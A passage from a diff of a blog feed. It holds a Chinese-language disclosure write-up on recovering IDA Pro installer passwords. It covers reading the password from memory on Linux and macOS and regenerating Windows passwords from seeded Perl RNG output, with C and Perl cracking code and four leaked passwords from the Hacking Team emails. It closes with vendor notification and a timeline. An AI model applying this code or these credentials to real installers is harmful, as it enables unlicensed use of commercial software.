+&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;Hex-Rays IDA Pro 是目前世界上最知名的反組譯工具，今天我們想來聊聊它的安裝密碼。什麼是安裝密碼？一般來說，在完成 IDA Pro 購買流程後，會收到一個客製化安裝檔及安裝密碼，在程式安裝過程中，會需要那組安裝密碼才得以繼續安裝。那麼，如果今天在網路上發現一包洩漏的 IDA Pro 安裝檔，我們有可能在不知道密碼的狀況下順利安裝嗎？這是一個有趣的開放性問題。&lt;/p&gt;
+
+&lt;p&gt;在我們團隊成員腦力激盪下，給出了一個驗證性的答案：是的，在有 Linux 或 MacOS 版安裝檔的狀況下，我們可以直接找到正確的安裝密碼；而在有 Windows 版安裝檔的狀況下，我們只需要十分鐘就可算出安裝密碼。&lt;/p&gt;
+
+&lt;p&gt;下面就是我們的驗證流程：&lt;/p&gt;
+
+&lt;h3 id=&quot;-linux-以及-macos-版&quot;&gt;* Linux 以及 MacOS 版&lt;/h3&gt;
+
+&lt;p&gt;最先驗證成功的是 Linux 及 MacOS 版，這兩個版本都是透過 InstallBuilder 封裝成安裝檔。我們嘗試執行安裝程式，並在記憶體中直接發現了未加密的安裝密碼。任務達成！&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190621/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在透過 Hex-Rays 協助回報後，&lt;a href=&quot;https://blog.bitrock.com/2019/02/installbuilder-1920-released.html&quot;&gt;BitRock&lt;/a&gt; 也在 2019/02/11 釋出了 InstallBuilder 19.2.0，加強了安裝密碼的保護。&lt;/p&gt;
+
+&lt;h3 id=&quot;-windows-版&quot;&gt;* Windows 版&lt;/h3&gt;
+
+&lt;p&gt;在 Windows 版上解決這個問題是項挑戰，因為這個安裝檔是透過 &lt;a href=&quot;http://www.jrsoftware.org/isinfo.php&quot;&gt;Inno Setup&lt;/a&gt; 封裝的，其安裝密碼是採用 &lt;a href=&quot;http://www.jrsoftware.org/ishelp/index.php?topic=setup_password&quot;&gt;160-bit SHA-1 hash&lt;/a&gt; 的方式儲存，因此我們無法透過靜態、動態程式分析直接取得密碼，透過暴力列舉也不是一個有效率的方式。不過，如果我們掌握了產生密碼的方式，那結果可能就不一樣了，我們也許可以更有效率的窮舉。&lt;/p&gt;
+
+&lt;p&gt;雖然我們已經有了方向是要找出 Hex-Rays 如何產生密碼，但要去驗證卻是”非常困難”的。因為我們不知道亂數產生器是用什麼語言實作的，而目前已知至少有 &lt;a href=&quot;https://rosettacode.org/wiki/Random_number_generator_(included)&quot;&gt;88 種亂數產生器&lt;/a&gt;，種類太多了。同時，我們也無法知道亂數產生器所使用的字元組和字元順序是什麼。&lt;/p&gt;
+
+&lt;p&gt;要找出亂數產生器所使用的字元組是眾多困難事中比較簡單的一件，首先，我們竭盡所能的收集所有 IDA Pro 的安裝密碼，例如 WikiLeaks 所揭露的 hackingteam 使用之密碼：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;FgVQyXZY2XFk (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62729&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
+  &lt;li&gt;7ChFzSbF4aik (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/311769&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
+  &lt;li&gt;ZFdLqEM2QMVe (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62956&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
+  &lt;li&gt;6VYGSyLguBfi (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/70250&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;從所有收集到的安裝密碼中我們整理出所用到的字元組：&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;少了 &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;I&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;l&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;O&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;o&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;N&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;n&lt;/code&gt; 字元，推測這些都是容易混淆的字元，因此不放入密碼字元組中是合理的。接著，我們用這些字元組，猜測可能的排列順序：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz
+ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz
+23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ
+abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ
+abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789
+ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;最後，我們挑選幾個比較常見的語言（c/php/python/perl）並使用上述的字元組實作亂數產生器，列舉所有亂數組合，看看我們收集到的安裝密碼有沒有出現在這些組合中。例如我們用下面程式碼列舉 C 語言的亂數組合：&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
+#include&amp;lt;stdlib.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+                &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;大約一個月的運算，我們終於成功利用 Perl 亂數產生出 IDA Pro 的安裝密碼，而正確的字元組順序為 &lt;code class=&quot;highlighter-rouge&quot;&gt;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&lt;/code&gt;。例如 hacking team 洩漏的 IDA Pro 6.8 安裝密碼是 &lt;code class=&quot;highlighter-rouge&quot;&gt;FgVQyXZY2XFk&lt;/code&gt;，就可用下面程式碼產生：&lt;/p&gt;
+
+&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env perl&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;@_e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;split&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3326487116&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;$i $pw\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;透過這些資訊，我們可以建立一個用來暴力列舉安裝密碼的字典檔，縮短暴力列舉的時間，實作方式可參考 &lt;a href=&quot;https://github.com/kholia/inno2john&quot;&gt;inno2john&lt;/a&gt; 專案。在一般情況下，約十分鐘即可算出 windows 安裝檔的安裝密碼。&lt;/p&gt;
+
+&lt;p&gt;在回報 Hex-Rays 後，他們立刻表示之後將會使用更安全的安裝密碼。&lt;/p&gt;
+
+&lt;h2 id=&quot;總結&quot;&gt;總結&lt;/h2&gt;
+
+&lt;p&gt;本篇文章提出了一個開放性問題：在未知安裝密碼的情況下可不可以安裝 IDA Pro？結果我們在 Linux 以及 MacOS 版發現可以從記憶體中取得明文密碼。而在 Windows 版本中，我們黑箱找到了安裝密碼產生的方式，因此我們可以建立一份字典檔，用以縮短暴力列舉安裝密碼的時間，最終，我們約十分鐘可解出一組密碼，是一個可以接受的時間。&lt;/p&gt;
+
+&lt;p&gt;我們真的很喜歡這樣的過程：有根據的大膽猜測，竭盡全力用任何已知資訊去證明我們的想法，不論猜測是對是錯，都能從過程中獲得很多經驗。這也是為什麼我們這次願意花一個月時間去驗證一個成功機率不是很高的假設。附帶一提，這樣的態度，也被運用在我們&lt;a href=&quot;https://devco.re/services/red-team&quot;&gt;紅隊演練&lt;/a&gt;上，想要試試嗎 :p&lt;/p&gt;
+
+&lt;p&gt;寫在最後，要感謝 Hex-Rays 很友善且快速的回應。即使這個問題不包含在 &lt;a href=&quot;https://www.hex-rays.com/bugbounty.shtml&quot;&gt;Security Bug Bounty Program&lt;/a&gt; 裡面，仍然慷慨的贈送 Linux 和 MAC 版 IDA 及升級原有 Windows 版至 IDA Pro。再次感謝。&lt;/p&gt;
+
+&lt;h2 id=&quot;時間軸&quot;&gt;時間軸&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Jan 31, 2019 - 向 Hex-Rays 回報弱點&lt;/li&gt;
+  &lt;li&gt;Feb 01, 2019 - Hex-Rays 說明之後會增加安裝密碼的強度，並協助通報 BitRock&lt;/li&gt;
+  &lt;li&gt;Feb 11, 2019 - BitRock 釋出了 InstallBuilder 19.2.0&lt;/li&gt;
+&lt;/ul&gt;
+
+</content>
+ </entry>
  
  <entry>
    <title>Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!(EN)</title>
@@ -264,8 +545,8 @@ import org.restlet
 
 &lt;p&gt;Here is the full exploit:&lt;/p&gt;
 
-&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Poc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
